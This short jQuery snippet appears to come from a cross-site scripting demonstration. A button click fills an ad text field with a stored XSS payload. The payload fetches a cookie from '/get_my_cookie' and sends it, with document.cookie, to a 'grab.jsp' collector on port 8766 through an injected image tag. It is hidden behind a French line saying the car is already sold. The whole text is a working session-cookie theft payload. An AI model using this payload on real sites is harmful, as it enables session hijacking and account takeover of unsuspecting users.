$(function(){
	$("#myxss").click(function(){
		$('#textad').val("<script>window.onload=function(){$.ajax({url:'/get_my_cookie',success:function(data){document.body.innerHTML+=('<img class=\"imagexss\" src=\"http://"+window.location.hostname+":8766/grab.jsp?cookie1='+document.cookie+'&cookie2='+encodeURIComponent(data.cookie).replace(/'/g, '%27')+'\"/>');}});};</script> Désolée, la voiture a déjà été vendue.")
	});
});
